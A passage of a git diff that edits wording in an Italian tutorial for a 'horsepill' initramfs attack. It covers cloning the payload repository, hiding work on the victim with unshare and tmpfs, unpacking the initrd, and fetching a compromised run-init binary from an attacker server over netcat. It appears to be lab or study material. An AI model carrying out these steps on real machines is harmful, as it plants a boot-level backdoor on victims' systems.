@@ -24,7 +24,7 @@ In questo modo si ottengono due directory:
 
 entrambe hanno lo stesso contenuto e ciò consentirà di eseguire il `diff` a valle delle modifiche.
 
-Eseguiamo la `clone` del repository Github contenente il file corrente e i payload per l'esecuzione dell'attacco:
+Eseguiamo la `clone` del repository Github contenente il file corrente e il payload per l'esecuzione dell'attacco:
 ```
 git clone https://github.com/g3lbin/horsepill.git
 ```
@@ -107,14 +107,14 @@ Creiamo uno _scratch space_ per lavorare senza sporcare la macchina vittima:
 ```
 unshare -f
 ```
-> **Nota:** Questo permette di eseguire un program in un nuovo namespace e, se invocato senza target, lancia una shell. L'opzione `-f` (`--fork`) permette di forkare la shell come child di `unshare` invece di eseguirla in modo diretto, inoltre, mentre `unshare` è in wait per il child, ignora i segnali `SIGINT` e `SIGTERM` e non li inoltra al child. Quindi eventualmente vanno mandati direttamente al child.
+> **Nota:** Questo permette di eseguire un program in un nuovo namespace e, se invocato senza target, lancia una shell. L'opzione `-f` (`--fork`) permette di creare la shell come child di `unshare` invece di eseguirla in modo diretto, inoltre, mentre `unshare` è in wait per il child, ignora i segnali `SIGINT` e `SIGTERM` e non li inoltra al child. Quindi eventualmente vanno mandati direttamente al child.
 
 Tutto ciò che viene scritto ora non può essere visto dagli altri processi, dunque montiamo un file system temporaneo sulla directory `/lost+found`:
 ```
 mount -t tmpfs none /lost+found/
 cd /lost+found/
 ```
-È comodo creare due cartelle di lavoro che permettano di eseguire l'unpack e il repack dell'initial ramdisk:
+È comodo creare due cartelle di lavoro che permettano di eseguire l'_unpack_ e il _repack_ dell'initial ramdisk:
 ```
 mkdir tmp
 mkdir tmp/extracted
@@ -128,7 +128,7 @@ cd tmp/
 unmkinitramfs initrd.img-$(uname -r) ./extracted/
 cd extracted/
 ```
-Fatto ciò, è possibile esplorare e modificare il FS `initramfs`.
+Fatto ciò, è possibile esplorare e modificare il file system `initramfs`.
 
 Dal server attaccante si ottiene il binario compromesso `run-init` sfruttando `netcat`:
 - vittima (ip: 192.168.1.151)
